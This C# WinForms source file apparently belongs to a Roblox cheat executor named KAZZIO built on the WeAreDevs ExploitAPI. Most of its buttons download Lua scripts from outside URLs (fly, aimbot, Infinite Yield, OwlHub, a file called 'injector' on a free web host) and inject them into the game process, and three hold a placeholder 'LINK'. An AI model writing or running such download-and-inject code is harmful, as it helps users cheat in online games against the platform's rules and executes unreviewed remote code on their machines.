using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using WeAreDevs_API;

namespace KAZZIO
{
    public partial class UniversalScripts : UserControl
    {
        ExploitAPI module = new ExploitAPI();
        public UniversalScripts()
        {
            InitializeComponent();
        }

        private void gunaButton1_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://cdn.wearedevs.net/scripts/Fly.txt");
            module.SendLuaScript(Script);
        }

        private void gunaButton16_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://cdn.wearedevs.net/scripts/WRD%20Aimbot.txt");
            module.SendLuaScript(Script);
        }

        private void gunaButton7_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/hDiCnkaJ");
            module.SendLuaScript(Script);
        }

        private void gunaButton6_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source");
            module.SendLuaScript(Script);
        }

        private void gunaButton5_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt");
            module.SendLuaScript(Script);
        }

        private void gunaButton4_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("LINK");
            module.SendLuaScript(Script);
        }

        private void gunaButton3_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("LINK");
            module.SendLuaScript(Script);
        }

        private void gunaButton2_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("LINK");
            module.SendLuaScript(Script);
        }

        private void gunaButton8_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://farmware.000webhostapp.com/injector");
            module.SendLuaScript(Script);
        }

        private void label3_Click(object sender, EventArgs e)
        {

        }
    }
}
